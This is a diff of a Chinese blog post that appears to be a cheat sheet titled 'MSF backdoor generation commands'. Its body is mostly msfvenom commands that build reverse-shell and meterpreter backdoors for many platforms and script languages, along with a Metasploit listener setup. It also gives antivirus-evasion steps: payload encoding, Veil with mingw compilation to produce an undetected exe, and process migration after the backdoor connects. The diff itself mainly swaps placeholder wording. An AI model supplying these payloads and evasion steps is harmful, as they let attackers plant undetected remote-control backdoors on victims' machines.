@@ -81,14 +81,14 @@
 
 
 
-<meta name="description" content="MSF后门简单的记录一下。 0x00 MSFVenom参数MSFVenom通过各种操作系统，脚本语言来生成后门。其常用参数说明如下：     MSFVenom参数说明    e 编码方式   i 编码次数   b 在生成的程序中避免出现的值   f 输出格式   p 选择payload   l 查看所有payload   a 选择架构平台(x86|x64|x86_64)   o 文件输出   c">
+<meta name="description" content="MSF后门生成命令简单的记录一下。 0x00 MSFVenom参数MSFVenom通过各种操作系统，脚本语言来生成后门。其常用参数说明如下：     MSFVenom参数说明    e 编码方式   i 编码次数   b 在生成的程序中避免出现的值   f 输出格式   p 选择payload   l 查看所有payload   a 选择架构平台(x86|x64|x86_64)   o 文件输出">
 <meta property="og:type" content="article">
-<meta property="og:title" content="MSF后门">
+<meta property="og:title" content="MSF后门生成命令">
 <meta property="og:url" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2021&#x2F;07&#x2F;19&#x2F;MSF%E5%90%8E%E9%97%A8&#x2F;index.html">
 <meta property="og:site_name" content="白仁的博客">
-<meta property="og:description" content="MSF后门简单的记录一下。 0x00 MSFVenom参数MSFVenom通过各种操作系统，脚本语言来生成后门。其常用参数说明如下：     MSFVenom参数说明    e 编码方式   i 编码次数   b 在生成的程序中避免出现的值   f 输出格式   p 选择payload   l 查看所有payload   a 选择架构平台(x86|x64|x86_64)   o 文件输出   c">
+<meta property="og:description" content="MSF后门生成命令简单的记录一下。 0x00 MSFVenom参数MSFVenom通过各种操作系统，脚本语言来生成后门。其常用参数说明如下：     MSFVenom参数说明    e 编码方式   i 编码次数   b 在生成的程序中避免出现的值   f 输出格式   p 选择payload   l 查看所有payload   a 选择架构平台(x86|x64|x86_64)   o 文件输出">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2021-07-19T04:22:08.631Z">
+<meta property="og:updated_time" content="2021-08-25T08:03:26.211Z">
 <meta name="twitter:card" content="summary">
 
 
@@ -125,7 +125,7 @@
 
 
 
-  <title>MSF后门 | 白仁的博客</title>
+  <title>MSF后门生成命令 | 白仁的博客</title>
   
 
 
@@ -259,7 +259,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">MSF后门</h1>
+          <h1 class="post-title" itemprop="name headline">MSF后门生成命令</h1>
         
 
         <div class="post-meta">
@@ -331,7 +331,7 @@
       
 
       
-        <h1 id="MSF后门"><a href="#MSF后门" class="headerlink" title="MSF后门"></a>MSF后门</h1><p>简单的记录一下。</p>
+        <h1 id="MSF后门生成命令"><a href="#MSF后门生成命令" class="headerlink" title="MSF后门生成命令"></a>MSF后门生成命令</h1><p>简单的记录一下。</p>
 <h2 id="0x00-MSFVenom参数"><a href="#0x00-MSFVenom参数" class="headerlink" title="0x00 MSFVenom参数"></a>0x00 MSFVenom参数</h2><p>MSFVenom通过各种操作系统，脚本语言来生成后门。其常用参数说明如下： </p>
 <table>
 <thead>
@@ -371,56 +371,56 @@
 </tr>
 </tbody></table>
 <h2 id="0x01-后门生成"><a href="#0x01-后门生成" class="headerlink" title="0x01 后门生成"></a>0x01 后门生成</h2><p>Windows</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -e x86/shikata_ga_nai -b 'x00x0axff' -i <span class="number">3</span> -f exe -o payload.exe</span><br><span class="line"></span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=Attack IP LPORT=Atack port -e x86/shikata_ga_nai -b 'x00x0axff' -i <span class="number">3</span> -f exe -o payload.exe</span><br><span class="line"></span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=Attack IP LPORT=Atack port -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure>
 
 <p>Linux</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f elf -o payload.elf</span><br></pre></td></tr></table></figure>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=Attack IP LPORT=Atack port -f elf -o payload.elf</span><br></pre></td></tr></table></figure>
 
 <p>Mac</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f macho -o payload.macho</span><br></pre></td></tr></table></figure>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=Attack IP LPORT=Atack port -f macho -o payload.macho</span><br></pre></td></tr></table></figure>
 
 <p> powershell（反弹shell）</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST=</span><br><span class="line">攻击机IP LPORT=攻击机端口 -e <span class="built_in">cmd</span>/powershell_base64 -i <span class="number">3</span> -f raw -o payload.ps1</span><br></pre></td></tr></table></figure>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST=</span><br><span class="line">Attack IP LPORT=Atack port -e <span class="built_in">cmd</span>/powershell_base64 -i <span class="number">3</span> -f raw -o payload.ps1</span><br></pre></td></tr></table></figure>
 
 <p>php（反弹shell）</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw &gt; shell.php</span><br><span class="line"></span><br><span class="line">cat shell.php | pbcopy &amp;&amp; <span class="built_in">echo</span> '&lt;?php ' | tr -d 'n' &gt; shell.php &amp;&amp; pbpaste &gt;&gt;</span><br><span class="line">shell.php</span><br></pre></td></tr></table></figure>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=Attack IP LPORT=Atack port -f raw &gt; shell.php</span><br><span class="line"></span><br><span class="line">cat shell.php | pbcopy &amp;&amp; <span class="built_in">echo</span> '&lt;?php ' | tr -d 'n' &gt; shell.php &amp;&amp; pbpaste &gt;&gt;</span><br><span class="line">shell.php</span><br></pre></td></tr></table></figure>
 
 <p>aspx（反弹shell）</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=</span><br><span class="line">攻击机IP LPORT=攻击机端口 -f aspx -o payload.aspx</span><br></pre></td></tr></table></figure>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=</span><br><span class="line">Attack IP LPORT=Atack port -f aspx -o payload.aspx</span><br></pre></td></tr></table></figure>
 
 <p>jsp（反弹shell）</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom --platform java -p java/jsp_shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw -o payload.jsp</span><br></pre></td></tr></table></figure>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom --platform java -p java/jsp_shell_reverse_tcp LHOST=Attack IP LPORT=Atack port -f raw -o payload.jsp</span><br></pre></td></tr></table></figure>
 
 <p>war（反弹shell）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw -</span><br><span class="line">o payload.war</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=Attack IP LPORT=Atack port -f raw -</span><br><span class="line">o payload.war</span><br></pre></td></tr></table></figure>
 
 <p>nodejs（反弹shell）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p nodejs/shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw -o</span><br><span class="line">payload.js</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p nodejs/shell_reverse_tcp LHOST=Attack IP LPORT=Atack port -f raw -o</span><br><span class="line">payload.js</span><br></pre></td></tr></table></figure>
 
 <p>python（反弹shell）</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p python/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -</span><br><span class="line">f raw -o payload.py</span><br></pre></td></tr></table></figure>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p python/meterpreter/reverse_tcp LHOST=Attack IP LPORT=Atack port -</span><br><span class="line">f raw -o payload.py</span><br></pre></td></tr></table></figure>
 
 <p>perl（反弹shell）</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p <span class="built_in">cmd</span>/unix/reverse_perl LHOST=攻击机IP LPORT=攻击机端口 -f raw -o</span><br><span class="line">payload.pl</span><br></pre></td></tr></table></figure>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p <span class="built_in">cmd</span>/unix/reverse_perl LHOST=Attack IP LPORT=Atack port -f raw -o</span><br><span class="line">payload.pl</span><br></pre></td></tr></table></figure>
 
 <p>ruby（反弹shell）</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p ruby/shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f raw -o</span><br><span class="line">payload.rb</span><br></pre></td></tr></table></figure>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p ruby/shell_reverse_tcp LHOST=Attack IP LPORT=Atack port -f raw -o</span><br><span class="line">payload.rb</span><br></pre></td></tr></table></figure>
 
 <p>lua（反弹shell）</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p <span class="built_in">cmd</span>/unix/reverse_lua LHOST=攻击机IP LPORT=攻击机端口 -f raw -o</span><br><span class="line">payload.lua</span><br></pre></td></tr></table></figure>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p <span class="built_in">cmd</span>/unix/reverse_lua LHOST=Attack IP LPORT=Atack port -f raw -o</span><br><span class="line">payload.lua</span><br></pre></td></tr></table></figure>
 
 <p>windows shellcode</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=</span><br><span class="line">攻击机IP LPORT=攻击机端口 -f c</span><br></pre></td></tr></table></figure>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=</span><br><span class="line">Attack IP LPORT=Atack port -f c</span><br></pre></td></tr></table></figure>
 
 <p>linux shellcode</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=攻</span><br><span class="line">击机IP LPORT=攻击机端口 -f c</span><br></pre></td></tr></table></figure>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=Attack IP LPORT=Atack port -f c</span><br></pre></td></tr></table></figure>
 
 <p>mac shellcode</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=攻击机IP</span><br><span class="line">LPORT=攻击机端口 -f c</span><br></pre></td></tr></table></figure>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=Attack IP</span><br><span class="line">LPORT=Atack port -f c</span><br></pre></td></tr></table></figure>
 
 
 
-<h2 id="0x02-监听端口"><a href="#0x02-监听端口" class="headerlink" title="0x02 监听端口"></a>0x02 监听端口</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> PAYLOAD php/meterpreter/reverse_tcp（如果是windows就把php换成windows，以此类推）</span><br><span class="line"><span class="built_in">set</span> LHOST 攻击机IP</span><br><span class="line"><span class="built_in">set</span> LPORT 攻击机端口</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+<h2 id="0x02-监听端口"><a href="#0x02-监听端口" class="headerlink" title="0x02 监听端口"></a>0x02 监听端口</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> PAYLOAD php/meterpreter/reverse_tcp（如果是windows就把php换成windows，以此类推）</span><br><span class="line"><span class="built_in">set</span> LHOST Attack IP</span><br><span class="line"><span class="built_in">set</span> LPORT Atack port</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
 
 
 
@@ -432,10 +432,10 @@
 </blockquote>
 <p> 能过360纯静态查杀，但时隔1分钟左右会被行为检测、动态检测查杀。所以<strong>上线以后及时做进程迁移</strong>。 </p>
 <h3 id="01-veil-mingw-w64"><a href="#01-veil-mingw-w64" class="headerlink" title="01 veil+mingw-w64"></a>01 veil+mingw-w64</h3><p>veil是一个专门拿来做免杀的渗透框架。veil有两个<strong>免杀模块，Evasion和Ordnance</strong>，我们多用Evasion来做文件免杀。 veil使用docker镜像安装：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://hub.docker.com/r/mattiasohlsson/veil/</span><br><span class="line">docker pull mattiasohlsson/veil</span><br><span class="line">docker run -it -v /tmp/veil-output:/var/lib/veil/output:Z mattiasohlsson/veil</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://hub.docker.com/r/mattiasohlsson/veil/</span><br><span class="line">docker pull mattiasohlsson/veil</span><br><span class="line">docker run -it -v /tmp/veil -output:/var/lib/veil/output:Z mattiasohlsson/veil</span><br></pre></td></tr></table></figure>
 
 <p>用<strong>veil生成shellcode然后使用mibgw-264（windows下的gcc) 去加载</strong>。veil生成shellcode：</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use <span class="number">1</span>（选择Evasion模块)</span><br><span class="line">use <span class="number">7</span> (选择payload)</span><br><span class="line"><span class="built_in">set</span> LHOST 攻击机IP</span><br><span class="line"><span class="built_in">set</span> LPORT 攻击机端口</span><br><span class="line">gengrate</span><br></pre></td></tr></table></figure>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use <span class="number">1</span>（选择Evasion模块)</span><br><span class="line">use <span class="number">7</span> (选择payload)</span><br><span class="line"><span class="built_in">set</span> LHOST Attack IP</span><br><span class="line"><span class="built_in">set</span> LPORT Atack port</span><br><span class="line">gengrate</span><br></pre></td></tr></table></figure>
 
 <p>安装好mibgw-264进行编译即可，生成msf66.exe。百度<strong>找到mibgw-264这个安装包，然后在其bin目录下找到gcc.exe即可使用</strong>。生成的exe即是免杀后门，双击执行，msf可成功上线，然后进行迁移进程即可。 </p>
 
@@ -551,7 +551,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">66</span>
+                  <span class="site-state-item-count">70</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -604,7 +604,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#MSF后门"><span class="nav-number">1.</span> <span class="nav-text">MSF后门</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-MSFVenom参数"><span class="nav-number">1.1.</span> <span class="nav-text">0x00 MSFVenom参数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-后门生成"><span class="nav-number">1.2.</span> <span class="nav-text">0x01 后门生成</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-监听端口"><span class="nav-number">1.3.</span> <span class="nav-text">0x02 监听端口</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-免杀"><span class="nav-number">1.4.</span> <span class="nav-text">0x03 免杀</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#00-自捆绑-编码免杀"><span class="nav-number">1.4.1.</span> <span class="nav-text">00 自捆绑+编码免杀</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#01-veil-mingw-w64"><span class="nav-number">1.4.2.</span> <span class="nav-text">01 veil+mingw-w64</span></a></li></ol></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#MSF后门生成命令"><span class="nav-number">1.</span> <span class="nav-text">MSF后门生成命令</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-MSFVenom参数"><span class="nav-number">1.1.</span> <span class="nav-text">0x00 MSFVenom参数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-后门生成"><span class="nav-number">1.2.</span> <span class="nav-text">0x01 后门生成</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-监听端口"><span class="nav-number">1.3.</span> <span class="nav-text">0x02 监听端口</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-免杀"><span class="nav-number">1.4.</span> <span class="nav-text">0x03 免杀</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#00-自捆绑-编码免杀"><span class="nav-number">1.4.1.</span> <span class="nav-text">00 自捆绑+编码免杀</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#01-veil-mingw-w64"><span class="nav-number">1.4.2.</span> <span class="nav-text">01 veil+mingw-w64</span></a></li></ol></li></ol></li></ol></div>
             
 
           </div>
